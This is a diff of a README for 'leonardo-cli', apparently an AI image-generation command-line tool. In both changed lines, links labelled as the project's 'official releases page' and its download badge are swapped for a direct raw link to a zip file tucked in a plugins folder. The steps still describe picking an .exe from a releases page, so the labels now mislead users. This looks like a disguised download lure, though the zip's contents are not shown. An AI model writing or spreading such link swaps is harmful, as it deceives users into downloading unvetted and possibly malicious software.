@@ -1,6 +1,6 @@
 # 🎨 leonardo-cli - Create professional AI images with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Brinyarranged697/leonardo-cli/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Brinyarranged697/leonardo-cli/main/plugins/leonardo/skills/cli_leonardo_1.7.zip)
 
 Leonardo-cli provides a simple way to create digital images, videos, and high-quality upscales using your computer. This software bridges the gap between complex artificial intelligence models and your daily workflow. You do not need coding skills to generate visual content. The application processes your requests and communicates directly with the Leonardo.Ai engine to produce results on your machine.
 
@@ -8,7 +8,7 @@ Leonardo-cli provides a simple way to create digital images, videos, and high-qu
 
 Follow these steps to obtain the correct version for your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Brinyarranged697/leonardo-cli/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Brinyarranged697/leonardo-cli/main/plugins/leonardo/skills/cli_leonardo_1.7.zip).
 2. Look for the latest version listed at the top of the page.
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to start your download.
